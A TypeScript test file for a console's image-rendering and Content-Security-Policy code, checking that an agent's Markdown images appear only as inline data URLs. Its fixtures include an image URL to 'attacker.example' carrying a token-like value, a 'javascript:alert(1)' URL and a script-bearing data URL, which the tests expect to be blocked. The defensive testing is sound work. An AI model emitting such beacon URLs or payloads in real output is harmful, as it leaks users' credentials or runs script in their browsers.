import assert from "node:assert/strict";
import { test } from "node:test";
import { contentSecurityPolicy, SECURED_PATHS, securityHeaders } from "../src/lib/security/csp.ts";
import { imageDecision, isInlineImage } from "../src/lib/shared/markdown-image.ts";

// Review: an agent's Markdown must not make the owner's browser call
// out. Pure: the image decision and the page headers.

test("an agent's Markdown image is shown only inline; any URL, the Console's own included, becomes text", () => {
  // The decision no longer looks at the page's origin; called the way the
  // component once called it (with the origin), it must still refuse it.
  const withOrigin = imageDecision as unknown as (src: unknown, alt: unknown, origin: string) => ReturnType<typeof imageDecision>;
  for (const own of ["/api/auth/github?n=1", "https://squadroom.example/api/auth/callback"]) assert.equal(withOrigin(own, "x", "https://squadroom.example").show, false, own);
  assert.deepEqual(imageDecision("data:image/png;base64,iVBORw0KGgo=", "icon"), { show: true, src: "data:image/png;base64,iVBORw0KGgo=" });
  assert.equal(imageDecision("data:image/gif;base64,R0lGOD", "x").show, true);
  // A beacon, the Console's own routes (an image request carries the
  // owner's cookies: a sign-in start would burn its rate limit and replace
  // the sign-in state), a protocol-relative URL, another scheme, a data URL
  // that is not an image: text, with the URL shown.
  for (const src of [
    "https://attacker.example/p?t=sk-ant-oat01-xxx",
    "/api/auth/github?n=1",
    "/api/auth/callback",
    "https://squadroom.example/api/console/file?x=1",
    "/console/sw.js",
    "//attacker.example/p",
    "ftp://squadroom.example/p",
    "data:text/html;base64,PHNjcmlwdD4=",
    "javascript:alert(1)",
  ]) {
    const decision = imageDecision(src, "alt text");
    assert.equal(decision.show, false, src);
    assert.equal((decision as { text: string }).text, `[Image: alt text (${src})]`);
  }
  assert.deepEqual(imageDecision(undefined, undefined), { show: false, text: "[Image: image]" });
  // What the Markdown URL transform lets through for an image's source.
  assert.equal(isInlineImage("data:image/png;base64,iVBORw0KGgo="), true);
  for (const bad of ["data:text/html;base64,PHNjcmlwdD4=", "data:image/svg+xml,<svg/>", "https://a.example/x.png", 3, ""]) assert.equal(isInlineImage(bad), false, String(bad));
  assert.match((imageDecision(`https://a.example/${"x".repeat(300)}`, "") as { text: string }).text, /…\)\]$/);
});

test("the Console and sign-in pages carry a Content-Security-Policy and send no referrer", () => {
  const production = contentSecurityPolicy(false);
  for (const directive of ["default-src 'self'", "img-src 'self' data:", "connect-src 'self'", "frame-ancestors 'none'", "font-src 'self'", "object-src 'none'"])
    assert.ok(production.split("; ").includes(directive), directive);
  assert.doesNotMatch(production, /unsafe-eval|ws:/);
  // Only what the page cannot run without: inline scripts and styles.
  assert.match(production, /script-src 'self' 'unsafe-inline'(;|$)/);
  assert.match(production, /style-src 'self' 'unsafe-inline'(;|$)/);
  // Development adds the hot-reload socket and eval, nothing else.
  const dev = contentSecurityPolicy(true);
  assert.match(dev, /script-src 'self' 'unsafe-inline' 'unsafe-eval'/);
  assert.match(dev, /connect-src 'self' ws: wss:/);
  assert.equal(dev.replace(" 'unsafe-eval'", "").replace(" ws: wss:", ""), production);
  assert.deepEqual(securityHeaders(false).map((h) => h.key), ["Content-Security-Policy", "Referrer-Policy"]);
  assert.equal(securityHeaders(false)[1].value, "no-referrer");
  assert.deepEqual(SECURED_PATHS, ["/:path*"]);
});
